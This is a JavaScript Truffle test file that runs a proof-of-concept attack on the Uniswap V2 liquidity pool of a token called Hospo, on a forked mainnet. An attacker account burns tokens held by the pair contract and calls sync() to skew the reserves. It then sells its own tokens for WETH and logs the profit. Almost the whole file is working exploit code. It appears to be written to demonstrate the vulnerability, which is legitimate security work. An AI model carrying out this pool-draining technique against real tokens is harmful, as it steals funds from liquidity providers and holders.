const { ChainId, WETH, Token, Fetcher, Route, TokenAmount, TradeType, Trade, Percent } = require('@uniswap/sdk')
const BN = require('bn.js')
const ethers = require('ethers')

// ABIs
const { abi: IUniswapV2Router02ABI } = require('@uniswap/v2-periphery/build/IUniswapV2Router02.json')
const { abi: UniswapV2PairABI } = require('@uniswap/v2-core/build/UniswapV2Pair.json')
const wethAbi = require('../src/abi/WethABI.json')

const HospoToken = artifacts.require('Hospo')

const UniswapV2RouterAddr = '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D'
const WETH_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'

/**
 * To test:
 *
 * in a console window :
 * yarn ganache-forked
 *
 * then run test:
 *
 * truffle test --show-events ./test/hospowise-pool.test.js
 *
 */
contract('Hospowise - Pool Attack', (accounts) => {

  let deployer, attacker, user

  let uniswapRouterV2, uniswapPairAddr, uniswapPair, token, wethContract

  // these are the uniswap specific token impls
  let hospoUni, wethUni

  const provider = new ethers.providers.Web3Provider(web3.currentProvider)

  before(async () => {
    [deployer, attacker, user] = accounts
    uniswapRouterV2 = new web3.eth.Contract(IUniswapV2Router02ABI, UniswapV2RouterAddr)
    wethContract = new web3.eth.Contract(wethAbi, WETH_ADDRESS)
    // create our artifact
    token = await HospoToken.deployed()
    await token.startTrading()

    uniswapPairAddr = await token.uniswapV2Pair()
    uniswapPair = new web3.eth.Contract(UniswapV2PairABI, uniswapPairAddr, {from: deployer})
    hospoUni = new Token(ChainId.MAINNET, token.address, 18)
    wethUni = WETH[hospoUni.chainId]
  })

  let outputBalances = async function (msg = '::MARKER::') {
    const pairBalance = await token.balanceOf(uniswapPairAddr)
    const ownerBalance = await token.balanceOf(deployer)
    const attackerBalance = await token.balanceOf(attacker)
    const uniswapRouterBalance = await token.balanceOf(UniswapV2RouterAddr)

    console.log(`${msg} HOSPO BALANCES: `, {
      ownerBalance: ownerBalance.toString(),
      attackerBalance: attackerBalance.toString(),
      pairBalance: pairBalance.toString(),
      uniswapRouterBalance: uniswapRouterBalance.toString(),
    })
  }

  let getPairReserves = async function (pair) {
    const t0Reserve = pair.reserve0
    const t1Reserve = pair.reserve1
    const token1Bal = await token.balanceOf(uniswapPairAddr)
    const token2Bal = await wethContract.methods.balanceOf(uniswapPairAddr).call() // Web3 contract syntax.
    console.log(`uniswap pair balances: `, { hospo: token1Bal.toString(), hReserve: t0Reserve.toSignificant(6), weth: token2Bal.toString(), wReserve: t1Reserve.toSignificant(6) })
  }

  let getPairRoute = async function (token0, token1) {
    let pair = await Fetcher.fetchPairData(token0, token1, provider)
    const route = new Route([pair], token0)
    return { pair, route }
  }

  it('will hack hospo token UniswapPair', async () => {

    console.log(`Addresses: `, { deployer, attacker, user })
    console.log(`Hospo: `, { uniswapPair: uniswapPairAddr, address: token.address, owner: await token.owner() })

    // lets add some liquidity to the pool
    await web3.eth.personal.sendTransaction({
      from: deployer,
      to: token.address,
      value: new BN(web3.utils.toWei('100', 'ether')),
    })

    // setup the burn/token amounts
    const tokenAmount = new BN(web3.utils.toWei('1000', 'ether'))
    const burnAmount = new BN(web3.utils.toWei('999', 'ether'))
    const ethAmount = new BN(web3.utils.toWei('10', 'ether'))
    // so once we burn we are left with 10 ETHER equiv of tokens....

    // // put some tokens back into the contract itself... so we can get it to prime the pool
    await token.transfer(token.address, tokenAmount, { from: deployer })
    // ok this works now! 1:1000
    await token.testSetup(tokenAmount, ethAmount, { from: deployer })

    // lets transfer some to the attacker - to simulate him buying some.
    const attackerAmount = new BN(web3.utils.toWei('1000', 'ether'))
    await token.transfer(attacker, attackerAmount, { from: deployer })

    // lets see balances...
    await outputBalances('PREHACK')
    let { pair } = await getPairRoute(hospoUni, wethUni)
    await getPairReserves(pair)

    // now the hack

    /**
     * 1. I need to burn tokens in uniswap pool to skew the balance/ratio
     * 2. I need to then approve the router to work on my hospo tokens for amount
     * 3. I do a sell tokens for weth transfer.
     * 4. see what I get.
     */

    // NASTY
    await token.burn(uniswapPairAddr, burnAmount, { from: attacker })
    // approve the router to take our tokens...
    await token.approve(UniswapV2RouterAddr, attackerAmount, { from: attacker })
    // this reset the liquidity after our little burn above...
    await uniswapPair.methods.sync().send({from:attacker})

    // check the new ratios...
    let { route: postRoute } = await getPairRoute(hospoUni, wethUni)
    console.log('postburn/sync to 1 of opp token:', { leg1: postRoute.midPrice.toSignificant(10), leg2: postRoute.midPrice.invert().toSignificant(10) })

    await outputBalances('POSTBURN')
    const attackerWethPre = new BN(await wethContract.methods.balanceOf(attacker).call()) // Web3 contract syntax.
    console.log(`Attacker Pre Attack: `, {
      eth: (await web3.eth.getBalance(attacker)).toString(),
      weth: web3.utils.fromWei(attackerWethPre, 'ether'), // lets see it as ETH
      hospo: (await token.balanceOf(attacker)).toString(),
    })
    await getPairReserves(pair)

    // this is the attack trade...
    const amountIn = attackerAmount.toString();
    const trade = new Trade(postRoute, new TokenAmount(hospoUni, amountIn), TradeType.EXACT_INPUT)
    const slippageTolerance = new Percent('1', '10000') // 1bps 0.001 slippage.
    const amountOutMin = trade.minimumAmountOut(slippageTolerance).raw.toString()
    const path = [token.address, wethUni.address] // token -> weth trade.
    const to = attacker
    const deadline = Math.floor(Date.now() / 1000) + 60 * 2 // 20 mins +
    const gasUsed = await uniswapRouterV2.methods.swapExactTokensForTokens(amountIn, amountOutMin, path, to, deadline).estimateGas({ from: attacker, gas: 5000000 })
    console.log(`vars: `, { amountIn, amountOutMin, path, to, deadline, gasUsed })
    await uniswapRouterV2.methods.swapExactTokensForTokens(amountIn, amountOutMin, path, to, deadline).send({ from: attacker, gas: gasUsed })

    // ok lets see what we got out...
    await outputBalances('POST TRADE')
    pair = await Fetcher.fetchPairData(hospoUni, wethUni, provider)
    await getPairReserves(pair)
    const attackerWethPost = new BN(await wethContract.methods.balanceOf(attacker).call())
    const profit =  attackerWethPost.sub(attackerWethPre)
    console.log(`Attacker: Post Attack: `, {
      eth: (await web3.eth.getBalance(attacker)).toString(),
      weth: web3.utils.fromWei(attackerWethPost, 'ether'), // lets see it as ETH
      hospo: (await token.balanceOf(attacker)).toString(),
      profit: web3.utils.fromWei(profit, 'ether')
    })


  })

})

